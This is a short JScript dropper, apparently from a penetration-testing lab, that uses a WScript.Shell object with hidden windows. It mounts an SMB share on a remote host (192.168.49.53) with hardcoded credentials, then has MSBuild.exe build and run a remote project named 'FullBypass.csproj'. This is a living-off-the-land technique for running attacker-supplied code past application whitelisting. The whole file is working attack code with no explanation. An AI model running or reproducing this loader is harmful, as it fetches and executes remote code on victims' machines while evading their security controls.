// Create WScript.Shell object
var shell = new ActiveXObject("WScript.Shell");

// Execute commands
shell.Run("cmd /c net use \\\\192.168.49.53\\configs /user:testuser testpass", 0, true);
shell.Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe \\\\192.168.49.53\\configs\\FullBypass.csproj", 0, false);
